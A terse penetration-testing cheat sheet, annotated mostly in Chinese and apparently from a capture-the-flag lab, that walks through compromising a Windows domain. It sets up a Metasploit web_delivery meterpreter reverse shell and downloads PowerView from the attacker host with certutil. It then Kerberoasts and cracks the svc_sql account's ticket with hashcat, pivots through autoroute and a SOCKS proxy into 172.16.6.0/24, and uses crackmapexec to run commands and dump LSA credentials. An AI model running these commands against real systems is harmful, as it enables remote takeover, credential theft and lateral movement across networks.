msf delivery:
sudo msfconsole -q
search web_delivery
set payload windows/x64/meterpreter/reverse_tcp      选择playload
set LHOST PWNIP
set SRVHOST PWNIP
set TARGET 2      选择编程语言
exploit / run
在目标机器cml执行encoded script
ps      查看所有进程id
getpid  当前进程id
migrate <winlogin.exe pid>      迁移到 winlogin ，更稳定
python3 -m http.server 8000
meterpreter > shell    在目标机启动shell
cd C:\   跳到简单目录
C:\> certutil.exe -f -urlcache -split http://PWNIP:PWNPO/PowerView.ps1 PowerView.ps1      从攻击机想目标传送工具
C:\> powershell  在目标机启动powershell
C:\> cImport-Module .\PowerView.ps1
C:\> cGet-DomainUser * -SPN | select samaccountname      查找 SPN 账户
C:\> cGet-DomainUser -identity svc_sql | get-domainspnticket -format hashcat      用 svc_sql 账户，获得票据
echo ' <票据> '| tr -d "[:space:]"  > tgs_file      清楚空格和换行
hashcat -m 13100 tgs_file /usr/share/wordlists/rockyou.txt      本地破解哈希
meterpreter >  ipconfig      查看可能网段如 172.16.6.0/24
meterpreter > run autoroute -s 172.16.6.0/24      在 Meterpreter 会话添加路由，让攻击机通过跳板机，访问目标内网 172.16.6.0/24 网段
bg      后台当前session
use auxiliary/scanner/portscan/tcp      设置 SOCKS 代理
set rhosts 172.16.6.0/24
set PORTS 139,445      扫描 139 和 445 端口，they are common Windows ports and can have implications for remote code execution
set threads 50        50 个线程同时扫描
set VERSION 5        默认使用 SOCKS5
set SRVPORT 1080     默认使用 1080
run
sudo nano /etc/proxychains.conf      告诉系统上的其他工具（nmap、curl、浏览器等）通过这个代理访问内网
添加  socks5          127.0.0.1 1080
sudo proxychains cme smb 172.16.6.50 -u svc_sql -p lucky7      通过代理验证登录目标
sudo proxychains cme smb 172.16.6.50 -u svc_sql -p lucky7 -x "type C:\users\administrator\desktop\flag.txt"      读取flag
proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa      通过 Socks ，用 crackmapexec 对 172.16.6.50 进行 SMB 枚举，尝试用 svc_sql / lucky7 凭据通过 SMB 登录，执行 --lsa 模块，转储 LSA 凭据
